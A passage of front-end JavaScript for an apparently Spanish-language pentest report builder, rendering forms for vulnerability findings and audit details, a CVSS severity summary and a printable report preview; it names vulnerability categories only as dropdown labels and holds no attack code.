                                <option value="ssrf" ${state.currentFinding.templateKey === 'ssrf' ? 'selected' : ''}>SSRF</option>
                                <option value="csrf" ${state.currentFinding.templateKey === 'csrf' ? 'selected' : ''}>CSRF</option>
                                <option value="xxe" ${state.currentFinding.templateKey === 'xxe' ? 'selected' : ''}>XXE</option>
                                <option value="rce" ${state.currentFinding.templateKey === 'rce' ? 'selected' : ''}>RCE</option>
                                <option value="lfi" ${state.currentFinding.templateKey === 'lfi' ? 'selected' : ''}>LFI</option>
                                <option value="cors" ${state.currentFinding.templateKey === 'cors' ? 'selected' : ''}>CORS Misconfig</option>
                                <option value="path_traversal" ${state.currentFinding.templateKey === 'path_traversal' ? 'selected' : ''}>Path Traversal</option>
                                <option value="command_injection" ${state.currentFinding.templateKey === 'command_injection' ? 'selected' : ''}>Command Injection</option>
                                <option value="insecure_deserialization" ${state.currentFinding.templateKey === 'insecure_deserialization' ? 'selected' : ''}>Insecure Deserialization</option>
                                <option value="jwt_bypass" ${state.currentFinding.templateKey === 'jwt_bypass' ? 'selected' : ''}>JWT Bypass</option>
                                <option value="file_upload" ${state.currentFinding.templateKey === 'file_upload' ? 'selected' : ''}>File Upload</option>
                                <option value="security_misconfig" ${state.currentFinding.templateKey === 'security_misconfig' ? 'selected' : ''}>Security Misconfig</option>
                                <option value="missing_csp" ${state.currentFinding.templateKey === 'missing_csp' ? 'selected' : ''}>Missing CSP Header</option>
                                <option value="missing_x_frame" ${state.currentFinding.templateKey === 'missing_x_frame' ? 'selected' : ''}>Missing X-Frame-Options</option>
                                <option value="missing_x_content_type" ${state.currentFinding.templateKey === 'missing_x_content_type' ? 'selected' : ''}>Missing X-Content-Type-Options</option>
                                <option value="missing_referrer" ${state.currentFinding.templateKey === 'missing_referrer' ? 'selected' : ''}>Missing Referrer-Policy</option>
                                <option value="missing_permissions" ${state.currentFinding.templateKey === 'missing_permissions' ? 'selected' : ''}>Missing Permissions-Policy</option>
                                <optgroup label="WordPress">
                                    <option value="wordpress_xmlrpc" ${state.currentFinding.templateKey === 'wordpress_xmlrpc' ? 'selected' : ''}>WP XML-RPC Enabled</option>
                                    <option value="wordpress_rest_enum" ${state.currentFinding.templateKey === 'wordpress_rest_enum' ? 'selected' : ''}>WP User Enum via REST API</option>
                                    <option value="wordpress_error_enum" ${state.currentFinding.templateKey === 'wordpress_error_enum' ? 'selected' : ''}>WP User Enum via Errors</option>
                                    <option value="wordpress_login_brute" ${state.currentFinding.templateKey === 'wordpress_login_brute' ? 'selected' : ''}>WP Brute Force Login</option>
                                    <option value="wordpress_plugin_enum" ${state.currentFinding.templateKey === 'wordpress_plugin_enum' ? 'selected' : ''}>WP Plugin Enumeration</option>
                                    <option value="wordpress_theme_enum" ${state.currentFinding.templateKey === 'wordpress_theme_enum' ? 'selected' : ''}>WP Theme Enumeration</option>
                                    <option value="wordpress_config_exposure" ${state.currentFinding.templateKey === 'wordpress_config_exposure' ? 'selected' : ''}>WP wp-config.php Exposed</option>
                                    <option value="wordpress_uploads_directory" ${state.currentFinding.templateKey === 'wordpress_uploads_directory' ? 'selected' : ''}>WP Uploads Dir Listing</option>
                                    <option value="wordpress_version_leak" ${state.currentFinding.templateKey === 'wordpress_version_leak' ? 'selected' : ''}>WP Version Leak</option>
                                    <option value="wordpress_db_backup" ${state.currentFinding.templateKey === 'wordpress_db_backup' ? 'selected' : ''}>WP Database Backup Exposed</option>
                                </optgroup>
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label>${t.vulnTitle}</label>
                            <input type="text" id="findingTitle" value="${escapeHTML(state.currentFinding.title)}" required oninput="updateCurrentFinding('title', this.value)">
                        </div>
                        
                        <div class="form-group">
                            <label>${t.severity}</label>
                            <select id="findingSeverity" onchange="updateCurrentFinding('severity', this.value)">
                                ${Object.entries(t.severityLevels).map(([key, label]) =>
        `<option value="${key}" ${state.currentFinding.severity === key ? 'selected' : ''}>${label}</option>`
    ).join('')}
                            </select>
                        </div>
                        
                        <div class="form-group">
                            <label>${t.description}</label>
                            <textarea id="findingDescription" rows="4" oninput="updateCurrentFinding('description', this.value)">${escapeHTML(state.currentFinding.description)}</textarea>
                        </div>
                        
                        <div class="form-group">
                            <label>${t.cvss}</label>
                            <input type="text" id="findingCvss" value="${escapeHTML(state.currentFinding.cvss)}" oninput="updateCurrentFinding('cvss', this.value)">
                        </div>
                        
                        <div class="form-group">
                            <label>${t.poc}</label>
                            <textarea id="findingPoc" rows="4" oninput="updateCurrentFinding('poc', this.value)">${escapeHTML(state.currentFinding.poc)}</textarea>
                        </div>
                        
                        <div class="form-group">
                            <label>${t.impact}</label>
                            <textarea id="findingImpact" rows="3" oninput="updateCurrentFinding('impact', this.value)">${escapeHTML(state.currentFinding.impact)}</textarea>
                        </div>

                        <div class="form-group image-upload-section" onpaste="handleImagePaste(event)">
                            <label>${t.images} <small style="font-weight:normal;color:#666;">(también puedes pegar imagen con Ctrl+V aquí)</small></label>
                            <input type="file" id="findingImages" accept="image/*" multiple onchange="handleImageUpload(event)">
                            <small class="text-muted">${state.currentFinding.images.length} imagen(es) seleccionada(s)</small>
                        </div>

                        ${state.currentFinding.images.length > 0 ? `
                        <div class="image-preview-container">
                            ${state.currentFinding.images.map((img, idx) => `
                                <div class="image-preview-item">
                                    <img src="${img}" alt="Evidencia ${idx + 1}">
                                    <button type="button" class="image-remove-btn" onclick="removeImage(${idx})">×</button>
                                </div>
                            `).join('')}
                        </div>
                        ` : ''}

                        <div class="form-group">
                            <label>${t.remediation}</label>
                            <textarea id="findingRemediation" rows="3" oninput="updateCurrentFinding('remediation', this.value)">${escapeHTML(state.currentFinding.remediation)}</textarea>
                        </div>

                        <div class="form-group">
                            <label>${t.reference}</label>
                            <input type="text" id="findingReference" value="${escapeHTML(state.currentFinding.reference)}" oninput="updateCurrentFinding('reference', this.value)">
                        </div>

                        <div class="form-group">
                            <label>${t.cve}</label>
                            <input type="text" id="findingCve" value="${escapeHTML(state.currentFinding.cve)}" oninput="updateCurrentFinding('cve', this.value)">
                        </div>
                        
                        <div class="form-actions">
                            <button type="submit" class="btn-primary">${state.editingFindingIndex !== null ? t.updateFinding : t.addFinding}</button>
                            <button type="button" onclick="resetFindingForm()">${t.cancel}</button>
                        </div>
                    </form>
                </div>
            </div>
            
            <div class="editor-right">
                ${renderAuditData()}
                ${renderFindingsList()}
            </div>
        </div>
    `;
}

function renderAuditData() {
    const t = UI[state.lang];
    const d = state.auditData;

    return `
        <div class="card">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1.5rem;">
                <h3 style="margin: 0;">Datos de la Auditoría</h3>
                <button class="btn-primary" onclick="saveCurrentReport()" style="display: flex; align-items: center; gap: 0.5rem; padding: 0.5rem 1rem;" title="${t.saveReport}">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"></path>
                        <polyline points="17 21 17 13 7 13 7 21"></polyline>
                        <polyline points="7 3 7 8 15 8"></polyline>
                    </svg>
                    <span>${t.saveReport}</span>
                </button>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>${t.documentTitle}</label>
                    <input type="text" value="${escapeHTML(d.documentTitle)}" onchange="updateAuditData('documentTitle', this.value)">
                </div>
                <div class="form-group">
                    <label>${t.clientCompany}</label>
                    <input type="text" value="${escapeHTML(d.clientCompany)}" onchange="updateAuditData('clientCompany', this.value)">
                </div>
            </div>
            
            <div class="form-row">
                <div class="form-group" style="flex: 1;">
                    <label>${t.clientLogo1 || 'Logotipo 1'}</label>
                    <input type="file" accept="image/*" onchange="handleClientLogoUpload(event, 0)">
                    ${d.clientLogo[0] ? `
                        <div style="margin-top: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
                            <img src="${d.clientLogo[0]}" alt="Logo 1" style="height: 40px; border-radius: 4px; border: 1px solid #e5e7eb;">
                            <button type="button" class="btn-sm btn-secondary" onclick="removeClientLogo(0)">×</button>
                        </div>
                    ` : ''}
                </div>
                <div class="form-group" style="flex: 1;">
                    <label>${t.clientLogo2 || 'Logotipo 2'}</label>
                    <input type="file" accept="image/*" onchange="handleClientLogoUpload(event, 1)">
                    ${d.clientLogo[1] ? `
                        <div style="margin-top: 0.5rem; display: flex; align-items: center; gap: 0.5rem;">
                            <img src="${d.clientLogo[1]}" alt="Logo 2" style="height: 40px; border-radius: 4px; border: 1px solid #e5e7eb;">
                            <button type="button" class="btn-sm btn-secondary" onclick="removeClientLogo(1)">×</button>
                        </div>
                    ` : ''}
                </div>
            </div>

            <div class="form-row">
                <div class="form-group">
                    <label>${t.targetAsset}</label>
                    <input type="text" value="${escapeHTML(d.targetAsset)}" onchange="updateAuditData('targetAsset', this.value)">
                </div>
                <div class="form-group">
                    <label>${t.auditorCompany}</label>
                    <input type="text" value="${escapeHTML(d.auditorCompany)}" onchange="updateAuditData('auditorCompany', this.value)">
                </div>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>${t.auditorName}</label>
                    <input type="text" value="${escapeHTML(d.auditorName)}" onchange="updateAuditData('auditorName', this.value)">
                </div>
                <div class="form-group">
                    <label>${t.classification}</label>
                    <select onchange="updateAuditData('classification', this.value)">
                        ${Object.entries(t.classifications).map(([key, label]) =>
        `<option value="${key}" ${d.classification === key ? 'selected' : ''}>${label}</option>`
    ).join('')}
                    </select>
                </div>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>${t.version}</label>
                    <input type="text" value="${escapeHTML(d.version)}" onchange="updateAuditData('version', this.value)">
                </div>
                <div class="form-group">
                    <label>${t.date}</label>
                    <input type="date" value="${escapeHTML(d.date)}" onchange="updateAuditData('date', this.value)">
                </div>
            </div>

            <div class="form-group">
                <label>${t.auditType}</label>
                <select onchange="updateAuditData('auditType', this.value)">
                    ${Object.entries(t.auditTypes).map(([key, label]) =>
        `<option value="${key}" ${d.auditType === key ? 'selected' : ''}>${label}</option>`
    ).join('')}
                </select>
            </div>

            <div class="form-group">
                <label>${t.incidents}</label>
                <div class="incidents-toggle" style="display:flex; gap:0.75rem; margin-bottom:0.5rem;">
                    <label style="display:flex; align-items:center; gap:0.4rem; font-weight:500; text-transform:none; letter-spacing:normal; cursor:pointer;">
                        <input type="radio" name="hasIncidents" value="no" ${!d.hasIncidents ? 'checked' : ''} onchange="updateAuditData('hasIncidents', false); document.getElementById('incidentsTextContainer').style.display='none';" style="width:auto; padding:0; margin:0;">
                        ${t.incidentsNo}
                    </label>
                    <label style="display:flex; align-items:center; gap:0.4rem; font-weight:500; text-transform:none; letter-spacing:normal; cursor:pointer;">
                        <input type="radio" name="hasIncidents" value="yes" ${d.hasIncidents ? 'checked' : ''} onchange="updateAuditData('hasIncidents', true); document.getElementById('incidentsTextContainer').style.display='block';" style="width:auto; padding:0; margin:0;">
                        ${t.incidentsYes}
                    </label>
                </div>
                <div id="incidentsTextContainer" style="display: ${d.hasIncidents ? 'block' : 'none'}; margin-top: 0.5rem;">
                    <textarea rows="3" placeholder="${t.incidentsDesc}..." oninput="updateAuditData('incidentsText', this.value)">${escapeHTML(d.incidentsText)}</textarea>
                </div>
            </div>

            <hr style="margin: 1.5rem 0; border: none; border-top: 1px solid #e5e7eb;">

            <div class="form-group">
                <label>${t.auditSummary}</label>
                <small style="display:block; color:#666; margin-bottom:0.5rem; font-weight:normal;">${t.auditSummaryDesc}</small>
                <textarea rows="4" placeholder="${t.auditSummary}..." oninput="updateAuditData('auditSummary', this.value)">${escapeHTML(d.auditSummary)}</textarea>
            </div>

            <div class="form-group">
                <label>${t.testsPerformed}</label>
                <small style="display:block; color:#666; margin-bottom:0.5rem; font-weight:normal;">${t.testsPerformedDesc}</small>
                <textarea rows="4" placeholder="${t.testsPerformed}..." oninput="updateAuditData('testsPerformed', this.value)">${escapeHTML(d.testsPerformed)}</textarea>
            </div>

            <div class="form-group">
                <label>${t.recommendedSolutions}</label>
                <small style="display:block; color:#666; margin-bottom:0.5rem; font-weight:normal;">${t.recommendedSolutionsDesc}</small>
                <textarea rows="4" placeholder="${t.recommendedSolutions}..." oninput="updateAuditData('recommendedSolutions', this.value)">${escapeHTML(d.recommendedSolutions)}</textarea>
            </div>
        </div>
    `;
}

function renderFindingsList() {
    const t = UI[state.lang];

    if (state.findings.length === 0) {
        return `<div class="card"><p class="text-muted">No hay hallazgos registrados</p></div>`;
    }

    return `
        <div class="findings-list">
            ${state.findings.map((f, idx) => `
                <div class="finding-item severity-${f.severity}">
                    <div class="finding-header">
                        <span class="finding-number">#${idx + 1}</span>
                        <span class="finding-title">${escapeHTML(f.title)}</span>
                        <span class="finding-severity">${t.severityLevels[f.severity]}</span>
                        <div class="finding-actions">
                            <button class="btn-edit" onclick="editFinding(${idx})" title="${state.lang === 'es' ? 'Editar' : 'Edit'}">
                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                    <path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/>
                                    <path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/>
                                </svg>
                            </button>
                            <button class="btn-delete" onclick="deleteFinding(${idx})" title="${state.lang === 'es' ? 'Eliminar' : 'Delete'}">×</button>
                        </div>
                    </div>
                </div>
            `).join('')}
        </div>
    `;
}

function renderCvssSummary() {
    const total = state.findings.length;
    if (total === 0) return '';

    const t = UI[state.lang];
    const counts = {
        crit: state.findings.filter(f => f.severity === 'crit').length,
        high: state.findings.filter(f => f.severity === 'high').length,
        med: state.findings.filter(f => f.severity === 'med').length,
        low: state.findings.filter(f => f.severity === 'low').length,
        info: state.findings.filter(f => f.severity === 'info').length
    };

    const colors = {
        crit: 'var(--severity-crit, #dc2626)',
        high: 'var(--severity-high, #f97316)',
        med: 'var(--severity-med, #eab308)',
        low: 'var(--severity-low, #22c55e)',
        info: 'var(--severity-info, #6b7280)'
    };

    const order = ['crit', 'high', 'med', 'low', 'info'];
    let barSegments = '';
    let legendItems = '';

    for (const sev of order) {
        if (counts[sev] > 0) {
            const pct = (counts[sev] / total) * 100;
            barSegments += `<div style="width: ${pct}%; background-color: ${colors[sev]}; height: 100%; transition: width 0.3s;" title="${t.severityLevels[sev]}: ${counts[sev]}"></div>`;
        }

        legendItems += `
            <div style="display: flex; align-items: center; gap: 0.5rem; background: #f9fafb; padding: 0.5rem 1rem; border-radius: 0.5rem; border: 1px solid #e5e7eb;">
                <div style="width: 12px; height: 12px; border-radius: 50%; background-color: ${colors[sev]};"></div>
                <span style="font-weight: 500; color: #374151;">${t.severityLevels[sev]}</span>
                <span style="font-weight: 800; color: #111827; margin-left: 0.25rem;">${counts[sev]}</span>
            </div>
        `;
    }

    const title = state.lang === 'es' ? 'Resumen de Vulnerabilidades (CVSS)' : 'Vulnerabilities Summary (CVSS)';

    return `
        <div class="cvss-summary card" style="margin: 2rem 0; padding: 1.5rem; page-break-inside: avoid;">
            <h3 style="margin-bottom: 1.5rem; border-bottom: 1px solid #f3f4f6; padding-bottom: 0.75rem; color: #111827;">${title}</h3>
            
            <div style="display: flex; height: 28px; width: 100%; border-radius: 6px; overflow: hidden; margin-bottom: 1.5rem; box-shadow: inset 0 2px 4px 0 rgba(0,0,0,0.06);">
                ${barSegments}
            </div>
            
            <div style="display: flex; flex-wrap: wrap; gap: 1rem; justify-content: center;">
                ${legendItems}
            </div>
        </div>
    `;
}

function renderPreview() {
    if (state.activeTab !== 'preview' || state.showSplash || state.showReportSelector) return '';

    const t = UI[state.lang];
    const d = state.auditData;

    return `
        <div class="preview-container">
            <!-- PORTADA -->
            <div class="cover-page" style="
                display: flex;
                flex-direction: column;
                justify-content: space-between;
                min-height: 100vh;
                page-break-after: always;
                page-break-inside: avoid;
                background: #ffffff;
                color: #111827;
                padding: 0 3rem 0.25rem 3rem;
            ">
                
                <!-- PARTE SUPERIOR Y MEDIA CENTRALIZADA -->
                <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; flex: 1;">
                    
                    <div style="margin-bottom: 1rem; width: 100%; display: flex; justify-content: center; gap: 1rem; flex-wrap: wrap;">
                        ${d.clientLogo[0] || d.clientLogo[1] ? `
                            ${d.clientLogo[0] ? `
                                <img src="${d.clientLogo[0]}" alt="Logo Cliente 1" style="max-height: 200px; width: auto; max-width: 45%; object-fit: contain; display: block; filter: drop-shadow(0 10px 25px rgba(0,0,0,0.08));">
                            ` : ''}
                            ${d.clientLogo[1] ? `
                                <img src="${d.clientLogo[1]}" alt="Logo Cliente 2" style="max-height: 200px; width: auto; max-width: 45%; object-fit: contain; display: block; filter: drop-shadow(0 10px 25px rgba(0,0,0,0.08));">
                            ` : ''}
                        ` : `
                            <div style="width:160px; height:160px; background:linear-gradient(135deg,#2563eb,#1e40af); border-radius:32px; display:flex; align-items:center; justify-content:center; box-shadow:0 15px 40px rgba(37,99,235,0.3);">
                                <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 8v4"/><path d="M12 16h.01"/></svg>
                            </div>
                        `}
                    </div>

                    <!-- TÍTULO + RED TEAM INFO -->
                    <div style="display:flex; flex-direction:column; align-items:center; text-align:center;">
                        <h1 style="font-size: 3.5rem; font-weight: 900; letter-spacing: -0.04em; margin: 0 0 1.25rem; color: #0f172a; line-height:1.1; max-width: 800px;">
                            ${escapeHTML(d.documentTitle)}
                        </h1>

                        <div style="width: 80px; height: 5px; background: linear-gradient(90deg, #2563eb, #6366f1); border-radius: 6px; margin-bottom: 1.5rem; box-shadow: 0 4px 10px rgba(37,99,235,0.3);"></div>

                        <p style="font-size: 1.35rem; color: #475569; font-weight: 600; margin:0; letter-spacing: -0.01em;">
                            ${escapeHTML(d.targetAsset)}
                        </p>
                    </div>
                </div>

                <div style="margin-top: 2rem; background: linear-gradient(135deg, #f8fafc 0%, #f1f5f9 100%); border: 1px solid #e2e8f0; border-radius: 12px; padding: 1.5rem 2rem; box-shadow: 0 1px 3px rgba(0,0,0,0.05);">
                    <div style="display: flex; gap: 0;">
                        <div style="flex: 1; padding: 0 1rem; border-right: 1px solid #cbd5e1;">
                            <div style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.5rem;">
                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"><path d="M19 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11l5 5v11a2 2 0 0 1-2 2z"/><polyline points="17 21 17 13 7 13 7 21"/></svg>
                                <span style="font-size:0.6rem; font-weight:700; color:#64748b; text-transform:uppercase; letter-spacing:0.1em;">${t.clientCompany}</span>
                            </div>
                            <p style="font-size:0.95rem; font-weight:700; color:#0f172a; margin:0; line-height:1.4;">${escapeHTML(d.clientCompany)}</p>
                        </div>
                        <div style="flex: 1; padding: 0 1rem; border-right: 1px solid #cbd5e1;">
                            <div style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.5rem;">
                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
                                <span style="font-size:0.6rem; font-weight:700; color:#64748b; text-transform:uppercase; letter-spacing:0.1em;">${t.auditorCompany}</span>
                            </div>
                            <p style="font-size:0.95rem; font-weight:700; color:#0f172a; margin:0; line-height:1.4;">${escapeHTML(d.auditorCompany)}</p>
                            <p style="font-size:0.8rem; font-weight:500; color:#64748b; margin:0.25rem 0 0 0;">${escapeHTML(d.auditorName)}</p>
                        </div>
                        <div style="flex: 1; padding: 0 1rem; border-right: 1px solid #cbd5e1;">
                            <div style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.5rem;">
                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
                                <span style="font-size:0.6rem; font-weight:700; color:#64748b; text-transform:uppercase; letter-spacing:0.1em;">${t.date}</span>
                            </div>
                            <p style="font-size:0.95rem; font-weight:700; color:#0f172a; margin:0;">${escapeHTML(d.date)}</p>
                        </div>
                        <div style="flex: 0.7; padding: 0 1rem;">
                            <div style="display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.5rem;">
                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2"><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"/></svg>
                                <span style="font-size:0.6rem; font-weight:700; color:#64748b; text-transform:uppercase; letter-spacing:0.1em;">${t.version}</span>
                            </div>
                            <p style="font-size:1.1rem; font-weight:800; color:#2563eb; margin:0;">${escapeHTML(d.version)}</p>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- ÍNDICE -->
            <div class="index-page" style="padding: 4rem 2rem; min-height: 100vh; page-break-after: always; max-width: 900px; margin: 0 auto;">
                <h2 style="font-size: 2.25rem; color: #111827; margin-bottom: 2.5rem; border-bottom: 2px solid #e5e7eb; padding-bottom: 1rem; font-weight: 800;">Índice</h2>
                
                <div style="display: flex; flex-direction: column; gap: 0.75rem;">
                    <a href="#summary" style="display: flex; justify-content: space-between; text-decoration: none; color: #374151; font-weight: 700; padding: 0.75rem 0; border-bottom: 1px dotted #d1d5db; font-size: 1.125rem; transition: color 0.2s;">
                        <span>Resumen Ejecutivo (CVSS)</span>
                    </a>
                    <a href="#incidents" style="display: flex; justify-content: space-between; text-decoration: none; color: #374151; font-weight: 700; padding: 0.75rem 0; border-bottom: 1px dotted #d1d5db; font-size: 1.125rem; transition: color 0.2s;">
                        <span>${t.incidentsSectionTitle}</span>
                    </a>
                    
                    ${state.findings.length > 0 ? `<h3 style="margin-top: 2rem; margin-bottom: 1rem; color: #4b5563; font-size: 1.5rem; font-weight: 700;">Hallazgos Técnicos</h3>` : ''}
                    
                    ${state.findings.map((f, idx) => `
                        <a href="#finding-${idx}" style="display: flex; justify-content: space-between; text-decoration: none; color: #111827; padding: 0.75rem 0; border-bottom: 1px dotted #d1d5db; align-items: center; transition: background-color 0.2s;" onmouseover="this.style.backgroundColor='#f9fafb'" onmouseout="this.style.backgroundColor='transparent'">
                            <div style="padding-right: 1rem;">
                                <span style="display: inline-block; width: 2rem; font-weight: 700; color: #6b7280;">${idx + 1}.</span>
                                <span style="font-weight: 500;">${escapeHTML(f.title)}</span>
                            </div>
                            <div style="display: flex; align-items: center; gap: 1rem;">
                                <span style="font-size: 0.75rem; font-weight: 700; text-transform: uppercase; padding: 0.25rem 0.5rem; border-radius: 6px; background-color: var(--severity-${f.severity}); color: white; min-width: 80px; text-align: center; display: inline-block;">
                                    ${t.severityLevels[f.severity]}
                                </span>
                                <span style="font-weight: 700; color: #6b7280; font-size: 0.875rem; width: 40px; text-align: right;">${escapeHTML(f.cvss || '-')}</span>
                            </div>
                        </a>
                    `).join('')}
                </div>
            </div>
            
            <!-- RESUMEN EJECUTIVO + INCIDENCIAS (misma página) -->
            <div style="padding: 2rem 0; page-break-inside: avoid;">
                <div id="summary" style="margin-bottom: 3rem;">
                    <h2 style="font-size: 1.75rem; color: #111827; margin-bottom: 1.5rem; border-bottom: 2px solid #e5e7eb; padding-bottom: 0.75rem; font-weight: 800;">Resumen Ejecutivo</h2>
                    ${renderCvssSummary()}
                </div>
                
                <div id="incidents">
                    <h2 style="font-size: 1.75rem; color: #111827; margin-bottom: 1rem; border-bottom: 2px solid #e5e7eb; padding-bottom: 0.75rem; font-weight: 800;">${t.incidentsSectionTitle}</h2>
                ${d.hasIncidents ? `
                    <div style="background:#fff7ed; border:1px solid #fed7aa; border-left:6px solid #f97316; border-radius:10px; padding:1.5rem 2rem;">
                        <p style="font-weight:700; color:#c2410c; margin-bottom:0.75rem; font-size:1rem; display:flex; align-items:center; gap:0.5rem;">
                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path><line x1="12" y1="9" x2="12" y2="13"></line><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
                            Se registraron incidencias durante la auditoría
                        </p>
                        <p style="color:#9a3412; line-height:1.7; white-space:pre-wrap;">${formatMultiline(d.incidentsText || '')}</p>
                    </div>
                ` : `
                    <div style="background:#f0fdf4; border:1px solid #bbf7d0; border-left:6px solid #22c55e; border-radius:10px; padding:1.5rem 2rem; display:flex; align-items:center; gap:1rem;">
                        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
                        <p style="color:#166534; font-weight:600; font-size:1.05rem; margin:0;">${t.incidentsNoneText}</p>
                    </div>
                `}
            </div>

            <!-- HALLAZGOS TÉCNICOS -->
            <div class="findings-preview">
                ${state.findings.map((f, idx) => `
                    <div id="finding-${idx}" class="finding-preview severity-${f.severity}" style="margin-bottom: 3rem; background: white; padding: 2rem; border-radius: 12px; border-left: 6px solid var(--severity-${f.severity}); box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);">
                        <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 1.5rem; border-bottom: 1px solid #e5e7eb; padding-bottom: 1rem; page-break-after: avoid;">
                            <h3 style="font-size: 1.5rem; font-weight: 800; color: #111827; margin: 0;">${idx + 1}. ${escapeHTML(f.title)}</h3>
                            <div style="background-color: var(--severity-${f.severity}); color: white; padding: 0.5rem 1rem; border-radius: 8px; font-weight: 700; font-size: 0.875rem; text-transform: uppercase; white-space: nowrap; margin-left: 1rem;">
                                ${t.severityLevels[f.severity]}
                            </div>
                        </div>
                        
                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1.5rem; margin-bottom: 2rem;">
                            <div style="background: #f9fafb; padding: 1rem 1.5rem; border-radius: 8px; border: 1px solid #e5e7eb;">
                                <p style="font-size: 0.75rem; font-weight: 700; color: #6b7280; text-transform: uppercase; margin-bottom: 0.25rem;">CVSS Score</p>
                                <p style="font-size: 1.25rem; font-weight: 800; color: #111827; margin: 0;">${escapeHTML(f.cvss || 'N/A')}</p>
                            </div>
                            <div style="background: #f9fafb; padding: 1rem 1.5rem; border-radius: 8px; border: 1px solid #e5e7eb;">
                                <p style="font-size: 0.75rem; font-weight: 700; color: #6b7280; text-transform: uppercase; margin-bottom: 0.25rem;">CVE</p>
                                <p style="font-size: 1.25rem; font-weight: 800; color: #111827; margin: 0;">${escapeHTML(f.cve || 'N/A')}</p>
                            </div>
                            <div style="background: #f9fafb; padding: 1rem 1.5rem; border-radius: 8px; border: 1px solid #e5e7eb;">
                                <p style="font-size: 0.75rem; font-weight: 700; color: #6b7280; text-transform: uppercase; margin-bottom: 0.25rem;">URL de Referencia</p>
                                <p style="font-size: 0.875rem; font-weight: 500; color: #3b82f6; margin: 0; word-break: break-all;">${f.reference ? `<a href="${escapeHTML(f.reference)}" target="_blank" style="color: #3b82f6; text-decoration: none;">${escapeHTML(f.reference)}</a>` : 'N/A'}</p>
                            </div>
                        </div>
                        
                        ${f.description ? `
                            <div style="margin-bottom: 1.5rem;">
                                <h4 style="font-size: 1.125rem; font-weight: 700; color: #374151; margin-bottom: 0.75rem; display: flex; align-items: center; gap: 0.5rem;">
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="16" x2="12" y2="12"></line><line x1="12" y1="8" x2="12.01" y2="8"></line></svg>
                                    Descripción
                                </h4>
                                <p style="color: #4b5563; line-height: 1.6; word-wrap: break-word;"><span style="white-space: pre-wrap;">${formatMultiline(f.description)}</span></p>
                            </div>
                        ` : ''}
                        
                        ${f.poc ? `
                            <div style="margin-bottom: 1.5rem; background: #1e293b; color: #e2e8f0; padding: 1.5rem; border-radius: 8px; border: 1px solid #0f172a;">
                                <h4 style="font-size: 1.125rem; font-weight: 700; color: #f8fafc; margin-bottom: 0.75rem; display: flex; align-items: center; gap: 0.5rem; color: #f8fafc;">
                                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#93c5fd" stroke-width="2"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg>
                                    Pasos para Reproducir (PoC)
                                </h4>
                                <p style="font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; line-height: 1.75; font-size: 0.875rem; color: #e2e8f0; margin: 0;"><span style="white-space: pre-wrap;">${formatMultiline(f.poc)}</span></p>
                            </div>
                        ` : ''}
                        
                        ${f.images && f.images.length > 0 ? `
                            <div style="margin-bottom: 1.5rem;">
                                <h4 style="font-size: 1.125rem; font-weight: 700; color: #374151; margin-bottom: 1rem; display: flex; align-items: center; gap: 0.5rem;">
